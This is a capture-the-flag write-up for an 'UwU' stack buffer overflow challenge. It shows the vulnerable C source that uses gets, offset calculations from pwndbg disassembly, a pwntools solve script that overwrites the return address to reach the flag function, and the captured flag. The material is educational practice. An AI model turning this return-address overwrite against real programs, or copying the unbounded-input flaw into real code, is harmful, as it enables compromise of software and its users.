# Method 1 

## Source

```c 
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void UwU_flag()
{
	char flag[1024] = {0};
	puts("What the hack!! How you did get here!! (ꐦ°᷄д°᷅) ");
	FILE *f = fopen("flag.txt", "r");
	if (f == NULL)
	{
		printf("flag.txt file is missing (′゜ω。‵)\n");
		exit(0);
	}
	fgets(flag, sizeof flag / sizeof *flag, f);
	puts("Let me print the flag to you... ( ˘•ω•˘ )◞⁽˙³˙⁾");
	puts(flag);
}

void UwU_main()
{
	char UwU[8] = "nothing";
	char buffer[80];
	puts("Welcome to the world of UwU!! ฅ^•ﻌ•^ฅ\n");
	puts("Can you create some UwU for UwU? ⁄(⁄ ⁄•⁄ω⁄•⁄ ⁄)⁄");
	gets(buffer);
	// I have added some requirements you need to pass ( ^ω^)
	char *ptr = strstr(buffer, "UwU");	
	if (ptr != NULL && strstr(ptr, "UwUUwU") != NULL)
	{
		puts("Your UwU is UwU enough!! (╯✧∇✧)╯");
		// Now, badbad people can't get into UwU_flag that easily ( ^ω^)
		if (strcmp(UwU, "nothing") != 0)
		{
			// UwU_flag();
			exit(1);
		}
	}
	else
	{
		puts("Your input is not UwU enough!! _(┐ ◟;ﾟдﾟ)ノ");
		exit(1);
	}
}

int main()
{
	setvbuf(stdin, NULL, 2, 0);
	setvbuf(stdout, NULL, 2, 0);
	setvbuf(stderr, NULL, 2, 0);

	UwU_main();

	puts("See you next time!!（๑ • ‿ • ๑ ）\n");
	return 0;
}
```

Vulnerability:
- `gets` function doesn't verify input size and thus allows us to overflow the buffer and overwrite something to get flag!

## UwU_main
 
```c
void UwU_main()
{
	char UwU[8] = "nothing";
	char buffer[80];
	puts("Welcome to the world of UwU!! ฅ^•ﻌ•^ฅ\n");
	puts("Can you create some UwU for UwU? ⁄(⁄ ⁄•⁄ω⁄•⁄ ⁄)⁄");
	gets(buffer);
	// I have added some requirements you need to pass ( ^ω^)
	char *ptr = strstr(buffer, "UwU");	
	if (ptr != NULL && strstr(ptr, "UwUUwU") != NULL)
	{
		puts("Your UwU is UwU enough!! (╯✧∇✧)╯");
		// Now, badbad people can't get into UwU_flag that easily ( ^ω^)
		if (strcmp(UwU, "nothing") != 0)
		{
			// UwU_flag();
			exit(1); // <----------- avoid getting here
		}
	}
	else
	{
		puts("Your input is not UwU enough!! _(┐ ◟;ﾟдﾟ)ノ");
		exit(1); // <----------- avoid getting here
	}
}
```
# Main goal 
Our main target is to create a buffer (input) large enough to overflow and change function's return address that jumps to `UwU_flag` while passing the following filters 
```c
	char *ptr = strstr(buffer, "UwU");	
	if (ptr != NULL && strstr(ptr, "UwUUwU") != NULL)

    and

    if (strcmp(UwU, "nothing") != 0)
```
that tries to get us into `exit(1)` so that we cannot send the program to `UwU_flag` by overwritting `UwU_main`'s return address.

~~perhaps GOT hijacking can overwrite exit(1), something I heard of but haven't learned yet~~

By the way, if the program runs normally, `UwU_main`'s return address is `0x400959`, which is this particular line of code
```c
puts("See you next time!!（๑ • ‿ • ๑ ）\n");
```

That's because to jump to `UwU_main` from `main`. `call` instruction is used
```json
0x0000000000400954 <+99>:    call   0x400844 <UwU_main>
```
and `call <addr>` instruction pushes `$rip` to the top of the stack before jumping to `<addr>`. 

#### Therefore, after the function call:
```json 
00:0000│ rsp 0x7fffffffdc08 —▸ 0x400959 (main+104) ◂— mov edi, 0x400bb0
01:0008│ rbp 0x7fffffffdc10 ◂— 1 (base pointer of prev func)
XX:YYYY| [Stuff in the previosu stack (top)]
```
the address `0x7fffffffdc08` points to `0x400959` i.e. our return address back to next instruction of main. 

And `0x7fffffffdc08` is exactly what we wish to overwrite. It's win if we get into the `UwU_flag` by overwriting `0x400959` as the address of the start instruction of `UwU_flag`. 

To find the starting address of `UwU_flag`, pretty easy, we can get the assembly code with instruction addresses of the program easily by doing `disassemble UwU_flag` in `pwndbg`.

```json
pwndbg> disassemble UwU_flag
Dump of assembler code for function UwU_flag:
   0x00000000004007d6 <+0>:     push   rbp
```

## So, how do we get to  `0x7fffffffdc08` to overwrites it?

- calculate the offset from start of buffer, which goes upwards in memory, to `0x7fffffffdc08`.

#### where exactly does the buffer (our input) starts?
From the assembly code of `UwU_main`
```json 
   0x40086e <UwU_main+42>    lea    rax, [rbp - 0x60]               RAX => 0x7fffffffdba0 —▸ 0x7ffff7f97ff0 (_IO_file_jumps) ◂— 0
   0x400872 <UwU_main+46>    mov    rdi, rax                        RDI => 0x7fffffffdba0 —▸ 0x7ffff7f97ff0 (_IO_file_jumps) ◂— 0
   0x400875 <UwU_main+49>    mov    eax, 0                          EAX => 0
 ► 0x40087a <UwU_main+54>    call   gets@plt                    <gets@plt>
        rdi: 0x7fffffffdba0 —▸ 0x7ffff7f97ff0 (_IO_file_jumps) ◂— 0
        rsi: 0x7ffff7f9a643 (_IO_2_1_stdout_+131) ◂— 0xf9b710000000000a /* '\n' */
        rdx: 0
        rcx: 0x7ffff7eb6210 (write+16) ◂— cmp rax, -0x1000 /* 'H=' */
```

we can see that the address [rbp - 0x60] is passed into `gets` as the first argument via `rdi`

Therefore, out input starts at $rbp-0x60 i.e. `0x7fffffffdba0`

Offset = `0x7fffffffdc08` - `0x7fffffffdba0`  = `0x68` = `104` bytes from start of our input to the address that we want to overwrite

But before that, we need to pass some filters

### first filter UwU
```c
	char *ptr = strstr(buffer, "UwU");	
	if (ptr != NULL && strstr(ptr, "UwUUwU") != NULL)
```
checks whether there's string - "UwU" and "UwUUwU" in players' input  
Therefore, the first very bytes is a no-brainer - `b'UwUUwU'`which would be able to pass both checking. ~~I have been testing to bypass each checkings using pwndbg~~

### Second filter "nothing"
```c
if (strcmp(UwU, "nothing") != 0)
```

To pass this, we need to ensure that our buffer can also overwrite the value inside `UwU` correctly to `b'nothing\x00'`

Again to overwrite `UwU` to something we want, we need to find it's address and calculate the offset.

To do so, we again look at the assembly code
```as
0x4008bb <UwU_main+119>    lea    rax, [rbp - 0x10]            RAX => 0x7fffffffdbf0 ◂— 0x676e6968746f6e /* 'nothing' */
   0x4008bf <UwU_main+123>    mov    esi, 0x400b6b                ESI => 0x400b6b ◂— outsb dx, byte ptr [rsi] /* 'nothing' */
   0x4008c4 <UwU_main+128>    mov    rdi, rax                     RDI => 0x7fffffffdbf0 ◂— 0x676e6968746f6e /* 'nothing' */
 ► 0x4008c7 <UwU_main+131>    call   strcmp@plt                  <strcmp@plt>
        s1: 0x7fffffffdbf0 ◂— 0x676e6968746f6e /* 'nothing' */
        s2: 0x400b6b ◂— 0x676e6968746f6e /* 'nothing' */
```

we can clearly observe that `UwU` from the address `$rbp-0x10` i.e. `0x7fffffffdbf0` is loaded into `strcmp` as the first argument

Therefore, the offset to `0x7fffffffdbf0` is

`0x7fffffffdbf0` - `0x7fffffffdba0` = `0x50` = `80` bytes

```py
# solve script solve.py
from pwn import * 

# p = process("./program")
p = remote("chal.firebird.sh", 35019)

payload = b'UwUUwU' + b'A' * 74  # 80 bytes to UwU
payload += b'nothing' + b'\0' # make sure it's "nothing"
payload += b'A' * 8 # the data "nothing" itself at $rbp-0x10 takes 8 bytes, add 8 more bytes (16 bytes i.e. 0x10 ) to reach $rbp

payload += b'A' * 8 # according to the typical stack memory layout and actual stack section from pwndbg, the address to be overwritten is located at $rbp+0x8, 8 bytes above base pointer 
payload += p64(0x00000000004007d6) # overwrite the value to jump to UwU_flag

# double verification, 80 + 8 ("nothing") + 8 + 8 = 104, the offset we calculated earlier, perfect! 
p.sendline(payload)

p.interactive()
```


```
Welcome to the world of UwU!! ฅ^•ﻌ•^ฅ

Can you create some UwU for UwU? ⁄(⁄ ⁄•⁄ω⁄•⁄ ⁄)⁄
Your UwU is UwU enough!! (╯✧∇✧)╯
What the hack!! How you did get here!! (ꐦ°д°) 
Let me print the flag to you... ( ˘•ω•˘ )◞⁽˙³˙⁾
flag{w4rp1n6_7h3_f10w_w17h_UwU}
```
YEA! 
















Also, whenever we jump to a function, it does a `function prologue`
```as
push rbp
mov rbp, rsp
```
Therefore, the memory layout has always been like the following:
```pgsql
Higher addresses
[func arg2]
[func arg1]
[Return Address]     → 0x0000000000400959    # Address to return to
[prev func base_ptr] → 0xffffcf88 (push rbp & mov rbp, rsp) 
[Stack Frame Data]   → 0x08040000    # Other function data
[Local Buffer]       → "user input"  # Where input is stored
Lower addresses
```
Be aware that the `STACK` section of `pwndbg` is reversed, it is normally like the following as stack grows in downwards towards lower addresses
```asciidoc
High Memory Address (e.g., 0x7fffffffffff)
+------------------------+
|         ...           |
+------------------------+
|    Earlier Frames     |
+------------------------+
|    Return Address     |
+------------------------+
|      Saved RBP        |
+------------------------+
|   Local Variables     |  ← RSP points here (Top of Stack)
+------------------------+
|         ...           |
+------------------------+
Low Memory Address (e.g., 0x000000000000)
```